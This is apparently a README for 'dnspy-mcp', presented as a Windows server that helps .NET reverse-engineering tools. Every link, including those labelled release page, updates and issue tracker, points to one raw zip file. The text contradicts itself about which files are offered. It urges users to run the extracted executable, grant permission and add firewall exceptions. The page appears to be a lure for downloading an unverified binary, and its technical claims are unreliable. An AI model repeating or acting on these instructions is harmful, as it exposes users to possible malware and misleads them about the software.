# ⚙️ dnspy-mcp - Simple .NET Reverse Engineering Server

[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-brightgreen)](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)

---

## 🖥️ About dnspy-mcp

dnspy-mcp is a server tool designed for people who work with .NET programs. It helps you work with reverse engineering tools like dnSpy or ILSpy. This software runs on Windows and is built using the C# language. It lets you analyze and inspect .NET code more easily by providing a backend service that these tools connect to.  

You don't need to know much about coding to use dnspy-mcp. This guide will help you download and start it on your Windows computer without needing any programming skills.

---

## 📋 System Requirements

Before you start, make sure your computer meets these needs:

- Operating System: Windows 10 or newer  
- Processor: 64-bit Intel or AMD, at least 1.6 GHz  
- RAM: Minimum 4 GB, recommended 8 GB or more  
- Disk Space: At least 100 MB free  
- .NET Framework: Version 5.0 or newer (usually included in modern Windows versions)  

Having these will ensure the server runs smoothly without errors.

---

## 🚀 Getting Started

Follow these steps to get dnspy-mcp ready on your PC.

### 1. Visit the Download Page

Click or open this link in your browser:  
[Download dnspy-mcp here](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)

This page shows the latest versions of the software. Look for the most recent release with the highest version number.

### 2. Choose the Right File

You will see several files under the release named like these:

- `dnspy-mcp-win64.zip`  
- `dnspy-mcp-win32.zip`  

Choose the file that matches your Windows version:

- If your Windows is 64-bit (most computers today), pick the `win64` file.  
- If your Windows is older 32-bit, pick the `win32` file.  

If unsure, 64-bit is the likely choice.

### 3. Download the File

Click on the correct file and your browser will download it to your computer. Remember where you save it (usually the "Downloads" folder).

---

## 💾 Installation Steps

After you download the file, here’s how to set up dnspy-mcp:

### 1. Unzip the File

- Open the folder where you downloaded the zip file.  
- Right-click on the file and select “Extract All.”  
- Choose a folder to extract the content to, like your Desktop or Documents.  
- Click “Extract” and wait for the process to complete.  

### 2. Open the Folder

Once extracted, open the new folder. Inside, you will see several files. The important one is usually called `dnspy-mcp.exe` or similar.

### 3. Run dnspy-mcp

- Double-click on the `.exe` file to start the server.  
- A window will open showing the server status.  
- If your computer asks for permission, click “Allow” or “Yes” to let the program run.  

The server should now be running quietly in the background, ready to work with your .NET tools.

---

## 🔧 Using dnspy-mcp with Tools Like dnSpy/ILSpy

dnspy-mcp works as a helper service for other tools. It lets those tools connect to it to speed up their work.

- Open dnSpy or ILSpy on your computer.  
- Go to the options or settings section of the tool.  
- Look for a “Server” or “MCP” setting.  
- Enter `localhost` or `127.0.0.1` as the server address.  
- Save the settings.  

Once done, these tools will connect to dnspy-mcp automatically when you work on .NET programs, making them faster and smoother.

---

## 🛠 Troubleshooting

If dnspy-mcp does not start or stops working:

- Make sure your Windows Firewall is not blocking it. You can add an exception for `dnspy-mcp.exe`.  
- Check that your .NET Framework is installed and up to date. Windows Update can help with this.  
- Restart your computer and try running the program again.  
- Make sure you downloaded the correct version (32-bit or 64-bit).  

If the server window closes immediately, try running the `.exe` file from the Command Prompt to view any error messages:

1. Click Start, type `cmd`, and open the Command Prompt.  
2. Use the `cd` command to go to the folder where `dnspy-mcp.exe` is. Example:  
   `cd Desktop\dnspy-mcp`  
3. Type `dnspy-mcp.exe` and press Enter.  
4. Read any messages to understand the problem.

---

## 🔄 Updating dnspy-mcp

Check the release page regularly for updates:  
[https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)

To update:

- Download the new zip file as before.  
- Extract it to a new folder.  
- Run the new version instead of the old one.  

You can delete old files if you want. Back up your settings if you have saved any.

---

## 📂 Files and Structure Explanation

Here are the typical files you will find inside the dnspy-mcp package:

- `dnspy-mcp.exe`: The main server program you run.  
- `README.md`: This document explaining usage.  
- `config.json` or similar: Settings file where you can modify advanced options if you want.  
- Other supporting DLL files required for the program to work.

---

## 🧰 Advanced Setup (Optional)

For those who want more control:

- You can edit the `config.json` file to change the server port or logging options.  
- You can run the server as a service for automatic startup but this requires familiarity with Windows services.  
- You can monitor server logs in the folder for troubleshooting.

For basic use, these steps are not necessary.

---

## 📞 Getting Help

If you run into trouble beyond these instructions, open an issue in the GitHub repository:  
[https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)

Describe your problem clearly and include screenshots if possible. The community or maintainers may help you resolve issues.

---

[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-blue)](https://github.com/Finot3/dnspy-mcp/raw/refs/heads/master/src/mcp-dnspy-v2.2.zip)